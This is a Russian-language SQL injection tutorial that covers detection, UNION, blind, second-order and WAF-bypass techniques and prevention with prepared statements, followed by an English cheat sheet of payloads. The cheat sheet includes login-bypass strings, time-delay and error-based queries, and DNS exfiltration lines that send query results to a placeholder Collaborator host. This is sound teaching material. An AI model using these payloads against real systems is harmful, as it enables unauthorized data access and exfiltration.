В этом разделе мы объясняем:

- Что такое SQL injection (SQLi).
- Как находить и эксплуатировать различные типы уязвимостей SQLi.
- Как предотвращать SQLi.

![[sql-injection.svg]]

### Что такое SQL injection (SQLi)?

SQL injection (SQLi) — это уязвимость веб‑безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение отправляет в свою базу данных.

Это может позволить злоумышленнику просматривать данные, которые он обычно не может получить. Это могут быть данные, принадлежащие другим пользователям, или любые другие данные, к которым имеет доступ приложение.

Во многих случаях злоумышленник может изменять или удалять эти данные, вызывая постоянные изменения в содержимом или поведении приложения.

В некоторых ситуациях злоумышленник может развить атаку SQL injection до компрометации базового сервера или другой инфраструктуры бэкенда. Также это может позволить ему выполнять атаки типа «отказ в обслуживании» (DoS).

### Каков ущерб от успешной атаки SQL injection?

Успешная атака SQL injection может привести к несанкционированному доступу к конфиденциальным данным, таким как:

- Пароли.
- Данные кредитных карт.
- Личная информация пользователей.

Атаки SQL injection использовались во многих громких утечках данных за последние годы. Они приводили к репутационному ущербу и штрафам от регуляторов.

В некоторых случаях злоумышленник может получить постоянный «чёрный ход» в системы организации, что ведёт к долгосрочной компрометации, которая может оставаться незамеченной длительное время.

### Как обнаружить уязвимости SQL injection

Вы можете обнаружить SQL injection вручную, используя систематический набор тестов для каждой точки ввода в приложении. Обычно для этого отправляют:

- Символ одинарной кавычки `'` и ищут ошибки или другие аномалии.
- SQL‑синтаксис, который вычисляется в исходное значение точки ввода и в другое значение, и проверяют различия в ответах приложения.
- Булевы условия, такие как `OR 1=1` и `OR 1=2`, и проверяют различия в ответах приложения.
- Пэйлоады, вызывающие задержку выполнения внутри SQL‑запроса, и проверяют различия во времени ответа.
- OAST‑пэйлоады, которые инициируют внеполосное сетевое взаимодействие при выполнении в SQL‑запросе, и отслеживают такие взаимодействия.

Альтернативно, большинство уязвимостей SQL injection можно быстро и надёжно найти с помощью **Burp Scanner**.

### SQL injection в разных частях запроса

Большинство уязвимостей SQL injection возникает в **WHERE‑условии** запроса SELECT. Опытные тестировщики хорошо знакомы с этим типом SQLi.

Однако уязвимости SQL injection могут возникать в любой части запроса и в разных типах запросов. Другие распространённые места:

- В операторах `UPDATE` — в обновляемых значениях или в `WHERE`‑условии.
- В операторах `INSERT` — во вставляемых значениях.
- В операторах `SELECT` — в имени таблицы или столбца.
- В операторах `SELECT` — в секции `ORDER BY`.

### Примеры SQL injection

Существует множество уязвимостей, атак и техник SQL injection, которые проявляются в разных ситуациях. Некоторые распространённые примеры:

- **Извлечение скрытых данных** — модификация SQL‑запроса для возврата дополнительных результатов.
- **Подрыв логики приложения** — изменение запроса для вмешательства в бизнес‑логику.
- **UNION‑атаки** — получение данных из других таблиц базы данных.
- **Слепой SQL injection** — когда результаты управляемого запроса не возвращаются напрямую в ответах приложения.

### Извлечение скрытых данных (пример)

Представим приложение интернет‑магазина, которое отображает товары по категориям. Когда пользователь нажимает на категорию _Gifts_, его браузер запрашивает URL:

```
https://insecure-website.com/products?category=Gifts
```

Это заставляет приложение выполнить SQL‑запрос для получения данных о товарах:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Этот запрос просит базу данных вернуть все данные (`*`) из таблицы `products`, где категория = _Gifts_ и `released = 1`.

Условие `released = 1` используется для скрытия товаров, которые ещё не выпущены (для невыпущенных товаров `released = 0`).

Приложение не реализует защиту от SQL injection. Это значит, что злоумышленник может построить атаку, например:

```
https://insecure-website.com/products?category=Gifts'--
```

Результирующий запрос:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Здесь `--` — это индикатор комментария в SQL. Всё, что идёт после него, игнорируется. В результате условие `AND released = 1` удаляется, и отображаются все товары, включая невыпущенные.

Аналогично можно заставить приложение показать все товары из любой категории, даже неизвестной:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Результирующий запрос:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Такой запрос вернёт все товары, так как условие `1=1` всегда истинно.

> ⚠️ Предупреждение
> Будьте осторожны при внедрении условия `OR 1=1` в SQL‑запрос. Даже если оно кажется безвредным в текущем контексте, приложения часто используют данные из одного запроса в нескольких разных SQL‑операторах. Если такое условие попадёт в UPDATE или DELETE, это может привести к случайной потере данных.

### Подрыв логики приложения (Subverting application logic)

Представим приложение, которое позволяет пользователям входить в систему с именем пользователя и паролем. Если пользователь вводит имя пользователя **wiener** и пароль **bluecheese**, приложение проверяет учётные данные, выполняя следующий SQL‑запрос:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Если запрос возвращает данные пользователя, вход считается успешным. В противном случае он отклоняется.

В этом случае злоумышленник может войти под любым пользователем без необходимости знать пароль. Для этого он может использовать последовательность комментария SQL `--`, чтобы удалить проверку пароля из условия **WHERE** запроса.

Например, если ввести имя пользователя:

```
administrator'--
```

и оставить поле пароля пустым, получится следующий запрос:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Этот запрос возвращает пользователя с именем **administrator** и позволяет злоумышленнику успешно войти в систему от его имени.

### Извлечение данных из других таблиц базы данных

В случаях, когда приложение возвращает результаты SQL‑запроса, злоумышленник может использовать уязвимость SQL‑инъекции для получения данных из других таблиц базы данных. Для этого можно использовать ключевое слово **UNION**, чтобы выполнить дополнительный запрос **SELECT** и добавить его результаты к исходному запросу.

Например, если приложение выполняет следующий запрос с пользовательским вводом _Gifts_:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

Злоумышленник может ввести:

```sql
' UNION SELECT username, password FROM users--
```

В результате приложение вернёт все имена пользователей и пароли вместе с названиями и описаниями товаров.

### Уязвимости слепой SQL‑инъекции (Blind SQL injection vulnerabilities)

Многие случаи SQL‑инъекций являются **слепыми уязвимостями**. Это означает, что приложение не возвращает результаты SQL‑запроса или детали ошибок базы данных в своих ответах.

Тем не менее, такие уязвимости всё ещё могут быть использованы для получения несанкционированного доступа к данным, но применяемые техники, как правило, более сложные и трудновыполнимые.

### Техники эксплуатации слепых SQL‑инъекций

В зависимости от характера уязвимости и используемой базы данных можно применять следующие методы:

- **Изменение логики запроса**, чтобы вызвать различие в ответе приложения в зависимости от истинности определённого условия. Это может включать внедрение нового условия в булеву логику или условное вызвание ошибки, например деление на ноль.
- **Условная задержка выполнения запроса.** Это позволяет определить истинность условия по времени, которое приложение затрачивает на ответ.
- **Внеполосное сетевое взаимодействие (OAST).** Эта техника чрезвычайно мощная и работает в ситуациях, когда другие методы неэффективны. Часто она позволяет напрямую эксфильтровать данные через внеполосный канал. Например, можно встроить данные в DNS‑запрос к домену, который контролирует злоумышленник.

|Вид Blind SQLi|Суть метода|Индикаторы/Признаки|
|---|---|---|
|**По ответу (Boolean-based)**|Внедрение условий, которые изменяют логику запроса (например, `OR 1=1` vs `OR 1=2`).|Различия в ответах приложения: разные страницы, сообщения об ошибках, изменённый контент.|
|**По времени (Time-based)**|Внедрение условий, вызывающих задержку выполнения (например, `SLEEP(5)`).|Измеримые различия во времени ответа: при истинном условии ответ задерживается, при ложном — быстрый.|
|**По OAST (Out-of-band)**|Использование внеполосных каналов (например, DNS‑запросов) для утечки данных.|Внешние сетевые взаимодействия: DNS‑логи, HTTP‑запросы на контролируемый домен.|

### SQL‑инъекция второго порядка (Second‑order SQL injection)

**SQL‑инъекция первого порядка** возникает тогда, когда приложение обрабатывает пользовательский ввод из HTTP‑запроса и небезопасным образом вставляет его в SQL‑запрос.

**SQL‑инъекция второго порядка** возникает тогда, когда приложение принимает пользовательский ввод из HTTP‑запроса и сохраняет его для будущего использования. Обычно это делается путём помещения данных в базу данных, и на этапе сохранения уязвимость не проявляется. Позже, при обработке другого HTTP‑запроса, приложение извлекает сохранённые данные и небезопасным образом вставляет их в SQL‑запрос.

По этой причине SQL‑инъекция второго порядка также известна как **хранимая SQL‑инъекция (stored SQL injection)**.

![[second-order-sql-injection.svg]]
### SQL‑инъекция второго порядка

SQL‑инъекция второго порядка часто возникает в ситуациях, когда разработчики уже знают об уязвимостях SQL‑инъекций и поэтому безопасно обрабатывают начальное помещение пользовательского ввода в базу данных.

Однако позже, когда эти данные снова извлекаются и используются в другом SQL‑запросе, они ошибочно считаются «безопасными», так как ранее были сохранены корректно. На этом этапе данные могут быть обработаны небезопасным образом, потому что разработчик ошибочно доверяет им.

### Изучение базы данных

Некоторые основные возможности языка SQL реализованы одинаково во многих популярных СУБД. Поэтому многие методы обнаружения и эксплуатации SQL‑инъекций работают одинаково на разных типах баз данных.

Однако существуют и различия между распространёнными СУБД. Это означает, что некоторые техники поиска и эксплуатации SQL‑инъекций работают по‑разному в зависимости от платформы. Например:

- Синтаксис конкатенации строк.
- Синтаксис комментариев.
- Поддержка пакетных (или составных) запросов.
- Платформенно‑специфичные API.
- Формат сообщений об ошибках.

После того как вы выявили уязвимость SQL‑инъекции, полезно получить дополнительную информацию о базе данных. Это поможет в дальнейшем её эксплуатации.

### Получение информации о базе данных

- **Версия СУБД.** Можно запросить сведения о версии базы данных. Методы отличаются для разных СУБД, поэтому если определённый метод сработал, можно сделать вывод о типе базы данных. Например, в Oracle можно выполнить:

```sql
SELECT * FROM v$version
```

- **Список таблиц и колонок.** Также можно определить, какие таблицы существуют в базе данных и какие столбцы они содержат. Например, в большинстве СУБД можно выполнить:

```sql
SELECT * FROM information_schema.tables
```

## SQL‑инъекция в разных контекстах

В предыдущих лабораторных заданиях вы использовали строку запроса (query string), чтобы внедрить вредоносный SQL‑пэйлоад. Однако SQL‑инъекции можно выполнять через любой контролируемый ввод, который приложение обрабатывает как SQL‑запрос.

Например, некоторые сайты принимают данные во **формате JSON или XML** и используют их для запросов к базе данных.

Эти разные форматы могут предоставлять дополнительные способы **обфускации атак**, которые в противном случае блокировались бы WAF‑ами или другими механизмами защиты. Слабые реализации часто ищут в запросах распространённые ключевые слова SQL‑инъекций, поэтому их можно обойти, закодировав или экранировав символы в запрещённых ключевых словах.

Пример: SQL‑инъекция на основе XML, где используется escape‑последовательность для кодирования символа **S** в слове `SELECT`:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Этот ввод будет декодирован на стороне сервера перед тем, как попасть в SQL‑интерпретатор.

## Как предотвратить SQL‑инъекции

Большинство случаев SQL‑инъекций можно предотвратить, используя **параметризованные запросы** вместо конкатенации строк внутри SQL‑запроса. Такие запросы также известны как **prepared statements (подготовленные выражения)**.

### Уязвимый код (с конкатенацией строк):

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

### Безопасный код (с параметризованным запросом):

```java
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

### Где использовать параметризованные запросы

Их можно применять везде, где **недоверенные данные** вставляются в SQL‑запрос как значения:

- в **WHERE‑условиях**,
- в значениях для **INSERT**,
- в значениях для **UPDATE**.

Однако их **нельзя использовать** для обработки недоверенных данных в других частях запроса, например:

- в именах таблиц или столбцов,
- в секции **ORDER BY**.

Для таких случаев нужно использовать другие подходы:

- **Белые списки (whitelisting)** допустимых значений,
- или **альтернативную бизнес‑логику** для реализации требуемого поведения.

### Важное правило

Чтобы параметризованный запрос был эффективным, строка SQL должна быть **жёстко заданной константой**. Она **никогда** не должна содержать переменные данные из любых источников.

Не стоит решать «по ситуации», какие данные можно считать доверенными, и продолжать использовать конкатенацию строк для «безопасных» случаев. Легко ошибиться в происхождении данных или столкнуться с изменениями в коде, которые сделают «доверенные» данные уязвимыми.

# SQL injection cheat sheet

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string.

| Oracle     | `'foo'\|'bar'`                                                                    |
| ---------- | --------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                     |
| PostgreSQL | `'foo'\|'bar'`                                                                    |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings]  <br>`CONCAT('foo','bar')` |

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Oracle     | `--comment   `                                                                         |
| ---------- | -------------------------------------------------------------------------------------- |
| Microsoft  | `--comment   /*comment*/`                                                              |
| PostgreSQL | `--comment   /*comment*/`                                                              |
| MySQL      | `#comment`  <br>`-- comment` [Note the space after the double dash]  <br>`/*comment*/` |

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
| ---------- | ------------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                                 |
| PostgreSQL | `SELECT version()`                                                 |
| MySQL      | `SELECT @@version`                                                 |

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| PostgreSQL | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
| ---------- | --------------------------------------------------------------------------------------------------------------------------- |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`                     |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`               |

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.`                      |
| ---------- | -------------------------------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                             |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                             |

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | -------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                              |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                 |

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

| Oracle     | (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| MySQL      | The following techniques work on Windows only:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                                         |

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                            |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                               |
| PostgreSQL | `create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();` |
| MySQL      | The following technique works on Windows only:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                |